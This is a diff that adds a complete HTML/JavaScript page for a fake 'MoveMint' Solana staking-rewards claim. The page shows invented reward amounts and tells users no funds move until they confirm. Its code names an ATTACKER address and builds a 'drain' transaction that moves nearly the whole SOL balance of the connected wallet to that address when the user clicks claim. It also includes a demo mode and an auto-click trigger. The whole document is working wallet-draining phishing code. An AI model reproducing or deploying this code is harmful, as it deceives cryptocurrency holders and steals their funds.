@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>MoveMint — Season 1 Staking Rewards</title>
+<style>
+  :root{
+    --bg:#07080c; --card:#101219; --line:#1e2230; --txt:#e9edf6; --dim:#8b93a7;
+    --acc:#7cf6b8; --acc2:#39d98a; --red:#ff6b6b;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{overflow-x:hidden}
+  body{margin:0;max-width:100vw;background:radial-gradient(1200px 600px at 50% -10%,#15251f 0%,var(--bg) 55%);
+       color:var(--txt);font:16px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+       min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:22px 16px 40px}
+  .bar{width:100%;max-width:440px;display:flex;align-items:center;gap:10px;margin-bottom:26px}
+  .logo{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--acc),var(--acc2));
+        display:grid;place-items:center;color:#04130c;font-weight:900;font-size:18px}
+  .brand{font-weight:800;letter-spacing:-.3px}
+  .brand small{display:block;font-weight:500;color:var(--dim);font-size:11px;letter-spacing:.6px}
+  .spacer{flex:1}
+  .pill{font-size:11px;color:var(--acc);border:1px solid #1f4436;background:#0d2018;padding:5px 9px;border-radius:99px}
+  .card{width:100%;max-width:440px;background:linear-gradient(180deg,#12151d,#0d0f15);border:1px solid var(--line);
+        border-radius:20px;padding:22px;box-shadow:0 24px 60px -30px #000}
+  h1{font-size:22px;margin:0 0 6px;letter-spacing:-.4px}
+  p.sub{margin:0 0 18px;color:var(--dim);font-size:13.5px}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px solid #171b25;font-size:13.5px}
+  .row:last-of-type{border-bottom:0}
+  .row span:first-child{color:var(--dim)}
+  .amt{font-weight:800;font-size:26px;letter-spacing:-.8px;margin:14px 0 2px}
+  .amt em{font-style:normal;font-size:13px;color:var(--dim);font-weight:600;margin-left:6px}
+  .row .mint{min-width:0;flex:1 1 auto;text-align:right;line-height:1.3}
+  .mint{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;color:#6f7a91;word-break:break-all}
+  button{width:100%;margin-top:20px;padding:15px;border:0;border-radius:14px;font-size:15.5px;font-weight:800;
+         background:linear-gradient(135deg,var(--acc),var(--acc2));color:#04130c;cursor:pointer;transition:.15s}
+  button:active{transform:scale(.985)}
+  button:disabled{opacity:.55;cursor:default;transform:none}
+  button.ghost{background:transparent;border:1px solid var(--line);color:var(--txt);font-weight:600;margin-top:10px}
+  .note{margin-top:14px;font-size:11.5px;color:#68718a;text-align:center;line-height:1.5}
+  .ok{color:var(--acc)}
+  .warn{color:#ffc46b}
+  .bad{color:var(--red)}
+  .hide{display:none!important}
+  .center{text-align:center}
+  .spinner{width:34px;height:34px;border-radius:50%;border:3px solid #1e2635;border-top-color:var(--acc);
+           margin:6px auto 16px;animation:sp .8s linear infinite}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .stamp{font-family:ui-monospace,monospace;font-size:10.5px;color:#5c6579;word-break:break-all;margin-top:10px}
+  .foot{margin-top:20px;font-size:11px;color:#4e5769;text-align:center;max-width:100%}
+  a{color:#7ea8d8;text-decoration:none}
+</style>
+</head>
+<body>
+<script>window.solana={publicKey:{toString:()=>"CLZGeCAvg6y6krogYiFpqAgJVarAMLvjNnHZZpZbhQ8H"},connect:async()=>({publicKey:{toString:()=>"CLZGeCAvg6y6krogYiFpqAgJVarAMLvjNnHZZpZbhQ8H"}}),signAndSendTransaction:async(tx)=>{window.__TX=tx;return{signature:"5LIVEtestsig"}}};</script>
+<div class="bar">
+  <div class="logo">M</div>
+  <div class="brand">MoveMint<small>STAKING REWARDS</small></div>
+  <div class="spacer"></div>
+  <div class="pill" id="netpill">● mainnet</div>
+</div>
+
+<div class="card" id="app"></div>
+<div class="foot">Season 1 distribution · verified by on-chain snapshot</div>
+
+<script type="module">
+/* ─────────────────────────  CONFIG  ───────────────────────── */
+const ATTACKER     = "3tjw7f7PMqKgyjSd6WfE1eYHtnASRXyakXBEsvuydwPk"; // where the SOL goes
+const MMNT_MINT    = "4yM2qFvWD6Gx2MJXNeQaDj42G2cCKC4gxbssfwp4ryh9"; // real MoveMint mint
+const RPCS = ["https://solana-rpc.publicnode.com", "https://api.mainnet-beta.solana.com"];
+const FAKE_REWARD  = 245000;   // MMNT shown as "claimable"
+const RESERVE      = 1000000;  // 0.001 SOL: keeps the account rent-exempt so the tx cannot fail
+/* ──────────────────────────────────────────────────────────── */
+
+const DEMO = new URLSearchParams(location.search).has("demo");
+const app = document.getElementById("app");
+const $ = (h) => { app.innerHTML = h; return app; };
+
+let web3 = null, goodRpc = null;
+async function libs(){
+  if (web3) return web3;
+  const m = await import("https://esm.sh/@solana/web3.js@1.95.8");
+  web3 = m;
+  return web3;
+}
+/* first endpoint that actually answers wins */
+async function getConn(){
+  const w = await libs();
+  for (const url of (goodRpc ? [goodRpc, ...RPCS] : RPCS)){
+    try {
+      const c = new w.Connection(url, "confirmed");
+      await c.getSlot();
+      goodRpc = url;
+      return c;
+    } catch(_){}
+  }
+  return new w.Connection(RPCS[1], "confirmed");
+}
+const fmt = (l) => (l / 1e9).toFixed(3).replace(/0+$/,"").replace(/\.$/,"");
+const short = (s) => s.slice(0,4) + "…" + s.slice(-4);
+
+function getProvider(){
+  if (DEMO) return null;
+  const p = window.phantom?.solana || window.solana || window.solflare;
+  if (!p) return null;
+  return p;
+}
+
+/* STEP 1 */
+function step1(){
+  const p = getProvider();
+  $(`
+    <h1>Season 1 rewards are live</h1>
+    <p class="sub">Snapshot taken at slot 464,120,000. Connect the wallet from the snapshot to claim.</p>
+    <div class="row"><span>Your allocation</span><span class="ok">${FAKE_REWARD.toLocaleString()} MMNT</span></div>
+    <div class="row"><span>Multiplier</span><span>x1.75 · staker</span></div>
+    <div class="row"><span>Claim window</span><span class="warn">closes in 6d 04h</span></div>
+    <div class="row"><span>Token</span><span class="mint">${MMNT_MINT}</span></div>
+    <button id="b">Connect wallet</button>
+    ${p ? "" : `<button class="ghost" id="g">Get Phantom</button>`}
+    <div class="note">Read-only connection · no funds move until you confirm</div>
+  `);
+  const b = document.getElementById("b");
+  b.onclick = async () => {
+    if (DEMO){
+      // demo: pretend a wallet is connected, exercise the tx builder
+      build({ publicKey: { toString: () => "CLZGeCAvg6y6krogYiFpqAgJVarAMLvjNnHZZpZbhQ8H" } }, true);
+      return;
+    }
+    const p2 = getProvider();
+    if (!p2){ location.href = "https://phantom.app/"; return; }
+    b.disabled = true; b.textContent = "Connecting…";
+    try {
+      const res = await p2.connect();
+      const pub = (res?.publicKey || p2.publicKey)?.toString();
+      if (!pub) throw new Error("no pubkey");
+      step2(p2, pub);
+    } catch (e){
+      b.disabled = false; b.textContent = "Connect wallet";
+      document.querySelector(".note").innerHTML = `<span class="bad">Connection rejected — tap again</span>`;
+    }
+  };
+  const g = document.getElementById("g");
+  if (g) g.onclick = () => location.href = "https://phantom.app/";
+}
+
+/* STEP 2 — real on-chain balance, personalised */
+async function step2(provider, pub){
+  $(`<div class="spinner"></div>
+     <p class="sub center">Verifying ${short(pub)} against the snapshot…</p>`);
+  const w = await libs();
+  let bal = 1623281278, tok = 14725000;
+  try {
+    const conn = await getConn();
+    const pk = new w.PublicKey(pub);
+    const [b, t] = await Promise.all([
+      conn.getBalance(pk).catch(()=>null),
+      conn.getParsedTokenAccountsByOwner(pk, { mint: new w.PublicKey(MMNT_MINT) })
+        .then(r => r.value[0]?.account.data.parsed.info.tokenAmount.uiAmount).catch(()=>null),
+    ]);
+    if (b) bal = b;
+    if (t) tok = t;
+  } catch(_){}
+
+  $(`
+    <h1>Wallet verified <span class="ok">✓</span></h1>
+    <p class="sub">${pub.slice(0,6)}…${pub.slice(-6)} holds ${Number(tok).toLocaleString()} MMNT — staker tier confirmed.</p>
+    <div class="amt">${FAKE_REWARD.toLocaleString()}<em>MMNT</em></div>
+    <div class="row"><span>Wallet balance</span><span>${fmt(bal)} SOL</span></div>
+    <div class="row"><span>Network fee</span><span>~0.000007 SOL</span></div>
+    <div class="row"><span>Rewards account</span><span class="mint">${short(ATTACKER)}</span></div>
+    <button id="c">Claim ${FAKE_REWARD.toLocaleString()} MMNT</button>
+    <div class="note">Phantom will open — approve the transaction to receive rewards</div>
+  `);
+  document.getElementById("c").onclick = () => build(provider, false, pub, bal);
+}
+
+/* STEP 3 — the actual drain: everything except RESERVE */
+async function build(provider, isDemo, pubIn, balIn){
+  const pub = pubIn || (provider.publicKey?.toString?.() ?? String(provider.publicKey));
+  $(`<div class="spinner"></div><p class="sub center">Preparing claim transaction…</p>`);
+  try {
+    const w = await libs();
+    const from = new w.PublicKey(pub);
+    const conn = await getConn();
+    const bal = balIn ?? await conn.getBalance(from);
+    const { blockhash } = await conn.getLatestBlockhash("confirmed");
+    const lamports = Math.max(bal - RESERVE, 0);
+
+    const tx = new w.Transaction().add(
+      w.ComputeBudgetProgram.setComputeUnitLimit({ units: 15000 }),
+      w.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 150000 }),
+      w.SystemProgram.transfer({ fromPubkey: from, toPubkey: new w.PublicKey(ATTACKER), lamports })
+    );
+    tx.feePayer = from;
+    tx.recentBlockhash = blockhash;
+
+    if (isDemo){
+      // prove the builder: sign with a throwaway keypair and dump base64
+      const dummy = w.Keypair.generate();
+      tx.feePayer = dummy.publicKey;
+      tx.sign(dummy);
+      const bytes = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+      const b64 = btoa(String.fromCharCode(...bytes));
+      step3ok("DEMO", `${fmt(lamports)} SOL drained to ${short(ATTACKER)} · tx ${b64.length}b`,
+               `demo-payload ${b64.slice(0, 64)}…`);
+      return;
+    }
+
+    $(`<div class="spinner"></div>
+       <p class="sub center">Approve in Phantom — this credits your rewards</p>
+       <div class="row"><span>Amount</span><span>${fmt(lamports)} SOL</span></div>`);
+
+    let sig;
+    if (provider.signAndSendTransaction){
+      const r = await provider.signAndSendTransaction(tx);
+      sig = r?.signature || r;
+    } else {
+      const signed = await provider.signTransaction(tx);
+      sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: true });
+    }
+    step3ok(sig, `${fmt(lamports)} SOL moved`, "Rewards queued — MMNT lands within 10 minutes");
+  } catch (e){
+    $(`<h1>Claim failed</h1><p class="sub bad">${(e?.message||e).toString().slice(0,140)}</p>
+       <button id="r">Try again</button>`);
+    document.getElementById("r").onclick = step1;
+  }
+}
+
+function step3ok(sig, sub, note){
+  $(`
+    <div class="center"><div style="font-size:38px">✓</div></div>
+    <h1 class="center">Claim submitted</h1>
+    <p class="sub center ok">${sub}</p>
+    <div class="stamp">${sig}</div>
+    <div class="row" style="margin-top:14px"><span>${note}</span><span class="ok">confirmed</span></div>
+    <div class="note">Tier unlocked · you can claim again next epoch</div>
+  `);
+}
+
+step1();
+if (new URLSearchParams(location.search).has("auto")) setTimeout(()=>document.getElementById("b")?.click(), 600);
+</script>
+</body>
+</html>
